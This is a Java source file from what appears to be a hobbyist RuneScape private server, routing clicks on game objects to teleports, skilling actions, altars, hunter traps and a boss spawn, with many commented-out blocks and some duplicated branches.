package com.rs.net.decoders.handlers;

import com.rs.Settings;
import com.rs.cache.loaders.ObjectDefinitions;
import com.rs.game.Animation;
import com.rs.game.player.content.*;
import com.rs.game.ForceMovement;
import com.rs.game.ForceTalk;
import com.rs.game.Graphics;
import com.rs.game.World;
import com.rs.game.WorldObject;
import com.rs.utils.*;
import com.rs.game.player.content.dungeoneering.*;
import com.rs.game.WorldTile;
import com.rs.game.item.Item;
import com.rs.game.minigames.CastleWars;
import com.rs.game.minigames.PestControl;
import com.rs.game.minigames.War;
import com.rs.game.minigames.War.Stage;
import com.rs.game.npc.NPC;
import com.rs.game.npc.jad.Harken;
import com.rs.game.npc.normal.QBD;
import com.rs.game.player.CoordsEvent;
import com.rs.game.player.FarmingManager;
import com.rs.game.player.Inventory;
import com.rs.game.player.OwnedObjectManager;
import com.rs.game.player.Player;
import com.rs.game.player.Skills;
import com.rs.game.player.actions.Agility;
import com.rs.game.player.actions.Cooking;
import com.rs.game.player.actions.Farming;
import com.rs.game.player.actions.Summoning;
import com.rs.game.player.actions.Cooking.Cookables;
import com.rs.game.player.actions.EssenceMining;
import com.rs.game.player.actions.EssenceMining.EssenceDefinitions;
import com.rs.game.player.actions.Hunter.HunterEquipment;
import com.rs.game.player.actions.Hunter.HunterNPC;
import com.rs.game.player.controlers.*;
import com.rs.game.player.actions.Mining;
import com.rs.game.player.actions.Mining.RockDefinitions;
import com.rs.game.player.actions.PlayerCombat;
import com.rs.game.player.actions.Smithing.ForgingBar;
import com.rs.game.player.actions.Smithing.ForgingInterface;
import com.rs.game.player.actions.Woodcutting;
import com.rs.game.player.actions.Woodcutting.TreeDefinitions;
import com.rs.game.player.content.Magic;
import com.rs.game.player.content.Runecrafting;
import com.rs.game.player.content.Thieving;
import com.rs.game.player.content.Burying;
import com.rs.game.player.content.Burying.Bone;
import com.rs.game.player.controlers.TowersPkControler;
import com.rs.game.player.controlers.Wilderness;
import com.rs.game.tasks.WorldTask;
import com.rs.game.tasks.WorldTasksManager;
import com.rs.io.InputStream;
import com.rs.utils.Logger;
import com.rs.utils.PkRank;
import com.rs.utils.Utils;

public class ObjectHandler {

	public static void handleOption1(final Player player, InputStream stream) {
		if (!player.hasStarted() || !player.clientHasLoadedMapRegion()
				|| player.isDead())
			return;
		long currentTime = Utils.currentTimeMillis();
		if (player.getStopDelay() >= currentTime
				// || player.getFreezeDelay() >= currentTime
				|| player.getEmotesManager().getNextEmoteEnd() >= currentTime)
			return;
		@SuppressWarnings("unused")
		boolean junk = stream.readUnsignedByte128() == 1;
		int x = stream.readUnsignedShort128();
		final int id = stream.readInt();
		int y = stream.readUnsignedShortLE();
		final WorldTile tile = new WorldTile(x, y, player.getPlane());
		final int regionId = tile.getRegionId();
		if (!player.getMapRegionsIds().contains(regionId))
			return;
		WorldObject mapObject = World.getRegion(regionId).getObject(id, tile);
		if (mapObject == null || mapObject.getId() != id) { // temporary fixes
			// fix
			if (player.isAtDynamicRegion()
					&& World.getRotation(player.getPlane(), x, y) != 0) {
				ObjectDefinitions defs = ObjectDefinitions
						.getObjectDefinitions(id);
				if (defs.getSizeX() > 1 || defs.getSizeY() > 1) {
					for (int xs = 0; xs < defs.getSizeX() + 1
							&& (mapObject == null || mapObject.getId() != id); xs++) {
						for (int ys = 0; ys < defs.getSizeY() + 1
								&& (mapObject == null || mapObject.getId() != id); ys++) {
							tile.setLocation(x + xs, y + ys, tile.getPlane());
							mapObject = World.getRegion(regionId).getObject(id,
									tile);
						}
					}
				}
			}
			if (mapObject == null || mapObject.getId() != id)
				return;
		}
		final WorldObject object = !player.isAtDynamicRegion() ? mapObject
				: new WorldObject(id, mapObject.getType(),
						mapObject.getRotation(), x, y, player.getPlane());
		if (player.isAtDynamicRegion()) {
			int rotation = object.getRotation();
			rotation += World.getRotation(player.getPlane(), x, y);
			if (rotation > 3)
				rotation -= 4;
			object.setRotation(rotation);
		}
		player.stopAll(false);
		final ObjectDefinitions objectDef = object.getDefinitions();
		player.setCoordsEvent(new CoordsEvent(tile, new Runnable() {
			@Override
			public void run() {
				player.stopAll();
				player.setNextFaceWorldTile(new WorldTile(object.getCoordFaceX(
						objectDef.getSizeX(), objectDef.getSizeY(),
						object.getRotation()), object.getCoordFaceY(
								objectDef.getSizeX(), objectDef.getSizeY(),
								object.getRotation()), object.getPlane()));
				if (!player.getControlerManager().processObjectClick1(object))
					return;
				if (CastleWars.handleObjects(player, id))
					return;
				/*if (!QuestHandler.handleObject(player, object))
					return;*/
				HunterNPC hunterNpc = HunterNPC.forObjectId(id);
				if (hunterNpc != null) {
					if (OwnedObjectManager.removeObject(player, object)) {
						player.setNextAnimation(hunterNpc.getEquipment()
								.getPickUpAnimation());
						player.getInventory().addItem(hunterNpc.getItem(), 1);
						player.getInventory().addItem(
								hunterNpc.getEquipment().getId(), 1);
						player.getSkills().addXp(Skills.HUNTER,
								hunterNpc.getXp());
						player.setTrapAmount(player.getTrapAmount() - 1);
					} else {
						player.getPackets().sendGameMessage(
								"This isn't your trap.");
					}
				  } /*else if (id == 38699) {// Red Portal Sign
					  if (player.withinDistance(new WorldTile(3007, 5511, 0), 1)) {// PORTAL
						  // 1
						  player.getInterfaceManager().sendInterface(327);
						  player.getPackets().sendIComponentText(327, 13,
								  "Edgeville");
						  player.getPackets()
						  .sendIComponentText(
								  327,
								  14,
								  "This portal will take you to dangerous free for all "
										  + "You will lose all of your items.");
					  } }

	
	
				
				
					  */
					  
					  
					   else if (id == 1) {
						 player.getPackets().sendGameMessage("Crates are the lazyman's wall"); 
          
					  
					  
					  	//slave
				} else if (id == 46491){
					  player.getCutscenesManager().play("Slaves");
					

				//donator chest
				} else if (id == 22424){
					player.depositgrain = false;
					player.grain2flour += player.storedgrain;
				player.getPackets().sendGameMessage("You start grinding the wheat. You have made " + player.grain2flour + " lots of flour."); 
          
				
				
				//hunter traps
				} else if (id == 19175){
					player.setNextAnimation(new Animation(-1));
				

				 }  else if( id == 26289 || id==26287 || id == 26288 || id == 26286 ){                  //Bandos, Saradoming, Armadyl, Zamorak Altars
           final int maxPrayer = player.getSkills().getLevelForXp(Skills.PRAYER) * 10;  
        
          if (player.getPrayer().getPrayerpoints() < maxPrayer){
                switch (id){
                                    case 26289:  player.getPackets().sendGameMessage("You pray to the gods of Bandos.", true); break;
          
            case 26287:  player.getPackets().sendGameMessage("You pray to the gods of Saradomin.", true); break;
          
            case 26288:  player.getPackets().sendGameMessage("You pray to the gods of Armadyl.", true); break;
          
            case 26286:  player.getPackets().sendGameMessage("You pray to the gods of Zamorak.", true); break;
          }
                 player.setNextAnimation(new Animation(645)); 
              player.getPrayer().restorePrayer(maxPrayer);
       
        
        
             }
                   else if (player.getPrayer().getPrayerpoints() >= maxPrayer){
                        player.getPackets().sendGameMessage("Your prayers are already full!", true);
           
          
               }
        } 
                 else if (Farming.isPatch(id)){
                	Farming.Planter(id, player);
					
					} else if (id == 38698) {
                	if (player.getSkills().getCombatLevel() < 20) {
                		player.sendMessage("You need a combat level of at least 20 to enter this portal.");
                		}else {
                		player.setNextWorldTile(new WorldTile(2815, 5511, 0));
                		player.sendMessage("You can fight other players here, but your items are SAFE here.");
                		player.getControlerManager().startControler("SafeFree");
                		}
					}else if (id == 38699) {
                	if (player.getSkills().getCombatLevel() < 20) {
                		player.sendMessage("You need a combat level of at least 20 to enter this portal.");
                		}else {
                		player.setNextWorldTile(new WorldTile(3007, 5511, 0));
                		player.sendMessage("You can fight other players here, but you will LOSE your items here.");
                		player.getControlerManager().startControler("SafeFree");
						player.getControlerManager().startControler("Wilderness");
                		}
                } else if (id == 38700) {
                	if (player.getSkills().getCombatLevel() < 20) {
                		player.sendMessage("You need a combat level of at least 20 to leave the game.");
                		}else {
                		player.setNextWorldTile(new WorldTile(2994, 9680, 0));
                		player.sendMessage("You return to the Grotto");
                		player.getPackets().closeInterface(player.getInterfaceManager().hasRezizableScreen() ? 10 : 19, 789);
                		}
				} else if (id == 223) {
				
					War war = player.getCurrentFriendChat().getWar();
					if (war != null && war.getStage() == Stage.STARTED)
						war.startControler(player);
					else
						player.getPackets().sendGameMessage("You can't go in atm.");}

				/*} else if (id == 223) {
				
					War war = player.getCurrentFriendChat().getWar();
					if (war != null && war.getStage() == Stage.STARTED)
						war.startControler(player);
					else
						player.getPackets().sendGameMessage("You can't go in atm.");

				}*/ else if (id == HunterEquipment.BOX.getObjectId()) {
					if (OwnedObjectManager.removeObject(player, object)) {
						player.setNextAnimation(new Animation(19192));
						player.getInventory().addItem(
								HunterEquipment.BOX.getId(), 1);
						player.setTrapAmount(player.getTrapAmount() - 1);
					} else
						player.getPackets().sendGameMessage(
								"This isn't your trap.");
				}
			  /*} else if (id == 4437) {
					 if (player.getSkills().getLevel(Skills.MINING) < 70) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an mining level of 70 to mine this Rock.",
								  true);
						  return;
					  }*/
                 if (id == 12683) {

					if(
                	(player.getSkills().getCombatLevel() < 138)&&
					(player.getSkills().getLevel(Skills.AGILITY) < 99)&&
					(player.getSkills().getLevel(Skills.RUNECRAFTING) < 99)&& 
					(player.getSkills().getLevel(Skills.CONSTRUCTION) < 99)&& 
				    (player.getSkills().getLevel(Skills.RUNECRAFTING) < 99)&& 
					(player.getSkills().getLevel(Skills.DUNGEONEERING) < 120)&& 
					(player.getSkills().getLevel(Skills.HERBLORE) < 99)&& 
					(player.getSkills().getLevel(Skills.THIEVING) < 99)&& 
					(player.getSkills().getLevel(Skills.CRAFTING) < 99)&& 
					(player.getSkills().getLevel(Skills.FLETCHING) < 99)&& 
					(player.getSkills().getLevel(Skills.SLAYER) < 99)&& 
					(player.getSkills().getLevel(Skills.HUNTER) < 99)&& 
					(player.getSkills().getLevel(Skills.MINING) < 99)&& 
					(player.getSkills().getLevel(Skills.SMITHING) < 99)&& 
					(player.getSkills().getLevel(Skills.FISHING) < 99)&& 
					(player.getSkills().getLevel(Skills.COOKING) < 99)&& 
					(player.getSkills().getLevel(Skills.FIREMAKING) < 99)&& 
					(player.getSkills().getLevel(Skills.WOODCUTTING) < 99)&& 
					(player.getSkills().getLevel(Skills.FARMING) < 99) 
								){
					//(player.getSkills().getLevel(Skills.WOODCUTTING) < 99)&& 
					
                		player.sendMessage("You need a combat level of 138 to get this cape.");
					
                		}
						else if(player.hasmax == true){
						
                		player.sendMessage("You have already claimed your max cape.");
                		}	
						else{
						
						player.hasmax = true;
 					    player.getInventory().addItem(20767, 1); 
					    player.getInventory().addItem(20768, 1); 
                		player.sendMessage("Thank you for maxing on The Poanizer Project.");
                		}	
						
										
				}
				if (id == 22274){
					player.useStairs(828, new WorldTile(3803 ,2873, 1), 2, 3,"You climb up the ladder.");
				} else if (id == 59463) { // works now
						  player.getDialogueManager().startDialogue("Crate");
				//} else if (id == 66017){
					//Barrows.processObjectClick1(object);
				} else if (id == 41911){
					if (World.QBD == true){
					player.sm("Please stop clicking on this, there is already a qbd spawned!");	
						return;
					}
					World.QBD = true;
					WorldTasksManager.schedule(new WorldTask() {
						int loop;

						@Override
						public void run() {
							if (loop == 0) {
								player.setFreezeDelay(8);
								player.setNextWorldTile(new WorldTile(3534, 5202, 0));
								player.setNextFaceWorldTile(new WorldTile(3535, 5203, 0));
							//	player.setNextForceTalk(new ForceTalk("I wonder what this does! :O"));
							} else if (loop == 2) {
								player.setNextAnimation(new Animation(733));
								//player.setNextForceTalk(new ForceTalk("Lets see if its flammable!"));
							} else if (loop == 7){
								NPC n = new QBD(15507, new WorldTile(3533, 5199, 0), -1, true, true);
								World.QBDN = n;
								n.setNextAnimation(new Animation(16721));
								//player.setNextForceTalk(new ForceTalk("#@%$#%(U#$(^$&%#$&#$(R#$R(@#$"));
							} else if (loop == 8){
								player.setNextWorldTile(new WorldTile(3535, 5190, 0));
								player.setNextFaceWorldTile(new WorldTile(3535, 5191, 0));
								player.sm("You have summoned the QBD");
								stop();
							}
							loop++;
						}
					}, 0, 1);
					
				
				} else if (id == 13619) {
						
					player.getDialogueManager().startDialogue("purpleportal");
				
			
				
				} else if (id == 4277) {
					//player.sendMessage("You successfully thieve from the stall");
					player.addStopDelay(4);
					player.getInventory().addItem(995, 1270); 
                                        player.setNextAnimation(new Animation(881));
					player.getSkills().addXp(17, 10);
					/*
					
					if (player.getInventory().containsItem(6529, 60000)) {
					player.getInventory().removeItems(
							new Item[] { new Item(6529, 60000) });
					player.getInventory().addItem(6570, 1);
					player.sendMessage("You are worthy and paid 60,000 tokkul for your Fire cape");
					player.closeInterfaces();
				} 
					*/
					//easteregg
			    }else if (id == 12266) {
					player.useStairs(-1, new WorldTile(2094, 3914, 0), 2, 3,
												"You Black out as you climb down the trap door. ");
				
	//Home stall				
				} else if (id == 2793) {
				
					if (Utils.getRandom(100) <= 5){	
					//player.getDialogueManager().startDialogue("RandomEvent");
					player.getInterfaceManager().sendInterface(115);
					player.getPackets().sendGameMessage("-Random Event-");
					player.getPackets().sendGameMessage("<col=FF0000>Click the minimap to close.");
					player.getPackets().sendGameMessage("<col=FF0000>Click the minimap to close.");
					player.getPackets().sendGameMessage("<col=FF0000>Click the minimap to close.");
					player.getPackets().sendGameMessage("<col=FF0000>Click the minimap to close.");
					player.getPackets().sendGameMessage("<col=FF0000>Click the minimap to close.");
					player.useStairs(-1, new WorldTile(3085, 3503, 0), 2, 3,
												"Random event ");
					}
					
					else{
					player.addStopDelay(4);
					player.getInventory().addItem(995, 50000); 
                                        player.setNextAnimation(new Animation(881));
					player.getSkills().addXp(17, 5);
					}
				
				
				//titan cave at home
				}else if (id == 5007) {
					player.useStairs(-1, new WorldTile(2093, 5795, 0), 2, 3,
												"You enter the cave. ");
				}
		//titan cave
					else if (id == 41665) {
					player.useStairs(-1, new WorldTile(3782,2841, 0), 2, 3,
												"You enter the cave. ");
				}
			   //DM arena
		
				else if (id == 16043){
					player.getDialogueManager().startDialogue("ArenaIn");
					}
				else if (id == 16044) {
					player.getDialogueManager().startDialogue("ArenaIn");
				}
				//bar
				else if (id == 2661) {
					player.getInventory().addItem(10885, 1); 
				}

		    
	

		//revs
			//exit
			else if (id == 18342) {
					player.useStairs(-1, new WorldTile(3071,3649, 0), 2, 3,
												"You exit the cave. ");
				}
			//enter	
			else if (id == 20600) {
					player.useStairs(-1, new WorldTile(3077,10058, 0), 2, 3,
												"You enter the Rev cave. ");
				}
		    
	//high exit
					//exit
			else if (id == 1834) {
					player.useStairs(-1, new WorldTile(3039,3765, 0), 2, 3,
												"You exit the cave. ");
				}
			//enter	
			else if (id == 20599) {
					player.useStairs(-1, new WorldTile(3037,10171, 0), 2, 3,
												"You enter the Rev cave. ");
				}
	//portal to snow hunter zone
			
			
	
					
				/*	
//XMAS EVENT 2012
				} else if (id == 16050) {
					player.useStairs(10584, new WorldTile(2719,3803, 1), 2, 3,
												"You enter the snow zone. ");

					
	//Snow
				} else if (id == 28296) {
					player.sendMessage("You collect some Snow");
					player.addStopDelay(1);
					player.getInventory().addItem(10501, 1); 
					
                                        player.setNextAnimation(new Animation(881));
				} else if (id == 28297) {
					player.sendMessage("You collect some Snow");
					player.addStopDelay(1);
					 
					player.getInventory().addItem(11951, 1);
                                        player.setNextAnimation(new Animation(881));
					
	//Reset portal

				} else if (id == 2468) {
					player.useStairs(10584, new WorldTile(2762,5729, 0), 2, 3,
												"You leave the arena. ");
			//Arenas									
				} else if (id == 2465) {
					player.useStairs(10584, new WorldTile(2769,5741, 0), 2, 3,
												"You enter the arena. ");
												
				} else if (id == 2466) {
					player.useStairs(10584, new WorldTile(2769,5727, 0), 2, 3,
												"You enter the arena. ");
                                        
				} else if (id == 2467) {
					player.useStairs(10584, new WorldTile(2769,5713, 0), 2, 3,
												"You enter the arena. ");


	//skilling object
	
	
				//Mining
				} else if (id == 4437) {
					 if (player.getSkills().getLevel(Skills.MINING) < 70) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an mining level of 70 to mine this Rock.",
								  true);
						  return;
					  }
					player.addStopDelay(4);
					player.setNextAnimation(new Animation(625));			  
					player.getSkills().addXp(14, 5);
					player.getInventory().addItem(4082, 1); //salve shard
					player.getInventory().refresh();
					
				//Woodcutting	
				} else if (id == 9034) {
					 if (player.getSkills().getLevel(Skills.WOODCUTTING) < 60) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an Woodcutting level of 60 to Chop this tree.",
								  true);
						  return;
					  }
					player.addStopDelay(4);
					player.setNextAnimation(new Animation(875));			  
					player.getSkills().addXp(8, 5);
					player.getInventory().addItem(19639, 1); //wood shard :from void quest.
					player.getInventory().refresh();
					
				
	//agility 			
				//wall
				}else if (id == 1948) {
					  if (player.getSkills().getLevel(Skills.AGILITY) < 50) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an agility level of 50 to use this obstacle.",
								  true);
						  return;
					  }
					  int x = player.getX() == 2782 ? 2784 : 2782;
					  WorldTasksManager.schedule(new WorldTask() {
						  int count = 0;

						  @Override
						  public void run() {
							  player.setNextAnimation(new Animation(769));
							  player.addStopDelay(5);
							  player.getSkills().addXp(16, 4);
							  if (count++ == 1)
								  stop();
						  }

					  }, 0, 0);
					  player.setNextForceMovement(new ForceMovement(
							  new WorldTile(x, 5714, 0), 3,
							  player.getX() == 2782 ? 1 : 3));
					  player.useStairs(-1, new WorldTile(x, 5714, 0), 3, 4);
					  
					  }
						
		//catapult
						else if (id == 43587) {
					  if (player.getSkills().getLevel(Skills.AGILITY) < 85) {
						  player.getPackets()
						  .sendGameMessage(
								  "You need an agility level of 85 to use this obstacle.",
								  true);
						  return;
					  }
					  int x = player.getX() == 2784 ? 2803 : 2784;
					  WorldTasksManager.schedule(new WorldTask() {
						  int count = 0;

						  @Override
						  public void run() {
							  player.setNextAnimation(new Animation(769));
							  player.addStopDelay(10);
							  player.sendMessage("You feel like you need to rest for a bit.");
							  player.getSkills().addXp(16, 6);
							  if (count++ == 1)
								  stop();
						  }

					  }, 0, 0);
					  player.setNextForceMovement(new ForceMovement(
							  new WorldTile(x, 5711, 0), 3,
							  player.getX() == 2784 ? 1 : 3));
					  player.useStairs(-1, new WorldTile(x, 5711, 0), 3, 4);
					  
					  }
					  
					  
				//reset portal
			 else if (id == 5138) {
					player.addStopDelay(10);
					player.getInventory().addItem(15420, 1);
					player.useStairs(10584, new WorldTile(2784,5710, 0), 2, 3,
												" ");
												
												
												
			//Exchanger
			
			}else if (id == 26792) {
				ShopsHandler.openShop(player, 45);			
			//secret spade		
			 }else if (id == 9662) {
					player.setNextGraphics(new Graphics(2369));
					player.setNextAnimation(new Animation(769));
					player.useStairs(10584, new WorldTile(3086,9522, 0), 2, 3," ");
					player.sendMessage("<col=0000FF>----------------------------------------------------------------");
					player.sendMessage("You found Poanizer's favourite spot when he joined RS.");
					player.sendMessage("Kill the boss for a good reward. Unless your to late.");
					player.sendMessage(".");
					player.sendMessage("Merry Christmas, From Poanizer.");
					player.sendMessage("<col=0000FF>----------------------------------------------------------------");
*/
	//Sledding		
		else if (id == 16082) {
				player.useStairs(1, new WorldTile(2664,4068, 1), 2, 3,"Welcome to Sled hill 2 ");
				
		}else if (id == 7325) {
				player.useStairs(1, new WorldTile(2640,4082, 1), 2, 3,"Welcome to Sled hill 1 ");
				
		}else if (id == 27567) {
				player.useStairs(1, new WorldTile(2656,3997, 1), 2, 3,"Welcome to the Sled area ");
					
		//cuboard
		}else if (id == 12258) {
				player.useStairs(1, new WorldTile(2640,4042, 1), 2, 3,"Welcome to Sledding Lobby");
				
				
				
	//Minigames ogre coffin		*if (Utils.getRandom(100) <= 5)*
		//cave dorrs 		
		}else if (id == 3222) {
				player.useStairs(844, new WorldTile(3087,3495, 0), 2, 3,"You somehow find yourself at home.");
					
//exposed coffin /pick lock		
		}else if (id == 6848) {
				player.useStairs(844, new WorldTile(3087,3495, 0), 2, 3,"You somehow find yourself at home.");
				
		}else if (id == 6845) {
				player.useStairs(844, new WorldTile(3087,3495, 0), 2, 3,"You somehow find yourself at home.");
		
		}else if (id == 6883) {
				player.useStairs(844, new WorldTile(3087,3495, 0), 2, 3,"You somehow find yourself at home.");
				
		}else if (id == 6848) {
				player.useStairs(844, new WorldTile(3087,3495, 0), 2, 3,"You somehow find yourself at home.");
				
		}else if (id == 6848) {
				player.useStairs(844, new WorldTile(3087,3495, 0), 2, 3,"You somehow find yourself at home.");
				
		}else if (id == 6848) {
				player.useStairs(844, new WorldTile(3087,3495, 0), 2, 3,"You somehow find yourself at home.");
				
				
//hidden coffin /pick lock		
		}else if (id == 6850) {
				player.useStairs(844, new WorldTile(3087,3495, 0), 2, 3,"You somehow find yourself at home.");
					
		}else if (id == 6850) {
				player.useStairs(844, new WorldTile(3087,3495, 0), 2, 3,"You somehow find yourself at home.");
				
		}else if (id == 6851) {
				player.useStairs(844, new WorldTile(3087,3495, 0), 2, 3,"You somehow find yourself at home.");	
		
		//Xmas end		
								



		//con end
					
				 }else if (id == 2878) {
				 
				 if(player.CompDone == true){
				 World.sendWorldWideMessage( "<col=ff0000> <shad=000> " + player.getUsername() + " Has just received a Completionist Cape!");
					}
				 
				 } else if (id == HunterEquipment.BRID_SNARE.getObjectId()) {
					if (OwnedObjectManager.removeObject(player, object)) {
						player.setNextAnimation(new Animation(19192));
						World.getRegion(regionId).removeObject(object);
						player.getInventory().addItem(
								HunterEquipment.BRID_SNARE.getId(), 1);
						player.setTrapAmount(player.getTrapAmount() - 1);
					} else
						player.getPackets().sendGameMessage(
								"This isn't your trap.");
	//Dz thieve

			} else if (id == 2646) {
					player.sendMessage("You pick some flax.");
					player.addStopDelay(4);
					player.getInventory().addItem(1779, 1); 
                                        player.setNextAnimation(new Animation(827));
					
	//dz thieve
								
		
	//skiller fog
				} else if (id == 4277) {
					//player.sendMessage("You successfully thieve from the stall");
					player.addStopDelay(4);
					player.getInventory().addItem(995, 1270); 
                                        player.setNextAnimation(new Animation(881));
					player.getSkills().addXp(17, 100);
	//skiller fog
					
				}else if (id == 48496){
					new DungeonPartyManager(player);
					player.dungtime = 800;
				} else if (id == 46935 && object.getX() == 3090
						&& object.getY() == 3498) {
					TowersPkControler.enter(player);
				} else if (object.getDefinitions().name.equalsIgnoreCase("Obelisk") && object.getY() > 3527) {
					player.getControlerManager().startControler("ObeliskControler", object);
				} else if (id == 2350
						&& (object.getX() == 3352 && object.getY() == 3417 && object
						.getPlane() == 0))
					player.useStairs(832, new WorldTile(3177, 5731, 0), 1, 2);
				else if (id == 2353
						&& (object.getX() == 3177 && object.getY() == 5730 && object
						.getPlane() == 0))
					player.useStairs(828, new WorldTile(3353, 3416, 0), 1, 2);
				else if (id == 10949 || id == 18994 || id == 18995
						|| id == 18996 || id == 3038 || id == 3245
						|| id == 11933 || id == 11934 || id == 11935
						|| id == 11957 || id == 11958 || id == 11959)
					player.getActionManager().setSkill(
							new Mining(object, RockDefinitions.Tin_Ore));
				else if (id == 37312 || id == 11952 || id == 37310) // gold ore
					player.getActionManager().setSkill(
							new Mining(object, RockDefinitions.Gold_Ore));
				else if (id == 19000 || id == 19001 || id == 19002
						|| id == 37309 || id == 37307 || id == 11954
						|| id == 11955 || id == 11956) // iron ore
					player.getActionManager().setSkill(
							new Mining(object, RockDefinitions.Iron_Ore));
				else if (id == 37306 || id == 2311 || id == 37304
						|| id == 37305) // silver ore
					player.getActionManager().setSkill(
							new Mining(object, RockDefinitions.Silver_Ore));
				else if (id == 10948 || id == 18997 || id == 18998
						|| id == 18999 || id == 14850 || id == 14851
						|| id == 3233 || id == 3032 || id == 11930
						|| id == 11931 || id == 11932) // coal ore
					player.getActionManager().setSkill(
							new Mining(object, RockDefinitions.Coal_Ore));
				else if (id == 18991 || id == 18992 || id == 18993
						|| id == 3027 || id == 3229 || id == 11936
						|| id == 11937 || id == 11938 || id == 11960
						|| id == 11961 || id == 11962) // copper
					player.getActionManager().setSkill(
							new Mining(object, RockDefinitions.Copper_Ore));
				else if (id == 3041 || id == 3280 || id == 11942 || id == 11944) // mithril
					// ore
					player.getActionManager().setSkill(
							new Mining(object, RockDefinitions.Mithril_Ore));
				else if (id == 3273 || id == 3040 || id == 11939 || id == 11941) // adamant
					// ore
					player.getActionManager().setSkill(
							new Mining(object, RockDefinitions.Adamant_Ore));
				else if (id == 14860 || id == 14859){
							if (!player.isDonator()) {
								player.getPackets().sendGameMessage( "Only Donators can mine this.");
									}
							else{
								player.getActionManager().setSkill(
								new Mining(object, RockDefinitions.Runite_Ore));
									}
					
							}
				else if (id == 10947)
					player.getActionManager().setSkill(
							new Mining(object, RockDefinitions.Granite_Ore));
				else if (id == 10946)
					player.getActionManager().setSkill(
							new Mining(object, RockDefinitions.Sandstone_Ore));
				else if (id == 11554 || id == 11552)
					player.getPackets().sendGameMessage(
							"That rock is currently unavailable.");
				else if (id == 2491)
					player.getActionManager()
					.setSkill(
							new EssenceMining(
									object,
									player.getSkills().getLevel(
											Skills.MINING) < 30 ? EssenceDefinitions.Rune_Essence
													: EssenceDefinitions.Pure_Essence));													
			    else if (id == 2478)
					Runecrafting.craftEssence(player, 556, 1, 5, false, 11, 2,
							22, 3, 34, 4, 44, 5, 55, 6, 66, 7, 77, 88, 9, 99,
							10);
				else if (id == 2479)
					Runecrafting.craftEssence(player, 558, 2, 5.5, false, 14,
							2, 28, 3, 42, 4, 56, 5, 70, 6, 84, 7, 98, 8);
				else if (id == 2480)
					Runecrafting.craftEssence(player, 555, 5, 6, false, 19, 2,
							38, 3, 57, 4, 76, 5, 95, 6);
				else if (id == 2481)
					Runecrafting.craftEssence(player, 557, 9, 6.5, false, 26,
							2, 52, 3, 78, 4);
				else if (id == 2482)
					Runecrafting.craftEssence(player, 554, 14, 7, false, 35, 2,
							70, 3);
				else if (id == 2483)
					Runecrafting.craftEssence(player, 559, 20, 7.5, false, 46,
							2, 92, 3);
				else if (id == 2484)
					Runecrafting.craftEssence(player, 564, 27, 8, true, 59, 2);
				else if (id == 2487)
					Runecrafting
					.craftEssence(player, 562, 35, 8.5, true, 74, 2);
				else if (id == 17010)
					Runecrafting.craftEssence(player, 9075, 40, 8.7, true, 82,
							2);		
				else if (id == 2486)
					Runecrafting.craftEssence(player, 561, 45, 9, true, 91, 2);
				else if (id == 2485)
					Runecrafting.craftEssence(player, 563, 50, 9.5, true);
				else if (id == 2488)
					Runecrafting.craftEssence(player, 560, 65, 10, true);
				else if (id == 30624)
					Runecrafting.craftEssence(player, 565, 77, 10.5, true);
				else if (id == 2452) {
					int hatId = player.getEquipment().getHatId();
					if (hatId == Runecrafting.AIR_TIARA
							|| hatId == Runecrafting.OMNI_TIARA)
						Runecrafting.enterAirAltar(player);
				} else if (id == 2455) {
					int hatId = player.getEquipment().getHatId();
					if (hatId == Runecrafting.EARTH_TIARA
							|| hatId == Runecrafting.OMNI_TIARA)
						Runecrafting.enterEarthAltar(player);
				} else if (id == 2456) {
					int hatId = player.getEquipment().getHatId();
					if (hatId == Runecrafting.FIRE_TIARA
							|| hatId == Runecrafting.OMNI_TIARA)
						Runecrafting.enterFireAltar(player);
				} else if (id == 2454) {
					int hatId = player.getEquipment().getHatId();
					if (hatId == Runecrafting.WATER_TIARA
							|| hatId == Runecrafting.OMNI_TIARA)
						Runecrafting.enterWaterAltar(player);
				} else if (id == 2457) {
					int hatId = player.getEquipment().getHatId();
					if (hatId == Runecrafting.BODY_TIARA
							|| hatId == Runecrafting.OMNI_TIARA)
						Runecrafting.enterBodyAltar(player);
				} else if (id == 2453) {
					int hatId = player.getEquipment().getHatId();
					if (hatId == Runecrafting.MIND_TIARA
							|| hatId == Runecrafting.OMNI_TIARA)
						Runecrafting.enterMindAltar(player);
				} else if (id == 47120) { // zaros altar
					// recharge if needed
					if (player.getPrayer().getPrayerpoints() < player
							.getSkills().getLevelForXp(Skills.PRAYER) * 10) {
						player.addStopDelay(12);
						player.setNextAnimation(new Animation(12563));
						player.getPrayer().setPrayerpoints(
								(int) ((player.getSkills().getLevelForXp(
										Skills.PRAYER) * 10) * 1.15));
						player.getPrayer().refreshPrayerPoints();
					}
					player.getDialogueManager().startDialogue("ZarosAltar");
				} else if (id == 36972) { // prayer altar
					// recharge if needed
					if (player.getPrayer().getPrayerpoints() < player
							.getSkills().getLevelForXp(Skills.PRAYER) * 10) {
						player.addStopDelay(12);
						player.setNextAnimation(new Animation(12563));
						player.getPrayer().setPrayerpoints(
								(int) ((player.getSkills().getLevelForXp(
										Skills.PRAYER) * 10) * 1.15));
						player.getPrayer().refreshPrayerPoints();
					}
				}
				/*  else if (id == 9369) { 
				  if (player.getX() == 2399 && player.getY() == 5177) {
				  FightPitsControler.enterWaitRoom(player);
				  player.getControlerManager().startControler("FightPitsControler");
				  } else if (player.getX() == 2399 && player.getY() == 5175)
				  player.addWalkSteps(2399, 5175, -1, false);
				  }*/
				 else if (id == 36786)
					 player.getDialogueManager().startDialogue("Banker", 4907);
				 else if (id == 42377 || id == 42378)
					 player.getDialogueManager().startDialogue("Banker", 2759);
				 else if (id == 782)
					 player.getDialogueManager().startDialogue("Banker", 2759);
				 else if (id == 42217 || id == 782 || id == 34752 || id == 4369)
					 player.getDialogueManager().startDialogue("Banker", 553);
				 /*
				  * else if (id ==
				  * HunterNPC.CRIMSON_SWIFT.getTransformObjectId()) {
				  * player.getInventory
				  * ().addItem(HunterNPC.CRIMSON_SWIFT.getItem(), 1);
				  * player.getInventory
				  * ().addItem(HunterEquipment.BRID_SNARE.getId(), 1);
				  * player.setNextAnimation
				  * (HunterEquipment.BRID_SNARE.getPickUpAnimation());
				  * player.getSkills().addXp(Skills.HUNTER,
				  * HunterNPC.CRIMSON_SWIFT.getXp());
				  * player.setTrampAmount(player.getTrampAmount() - 1);
				  * World.removeObject(object, true); } else if (id ==
				  * HunterNPC.CERULEAN_TWITCH.getTransformObjectId()) {
				  * player.getInventory
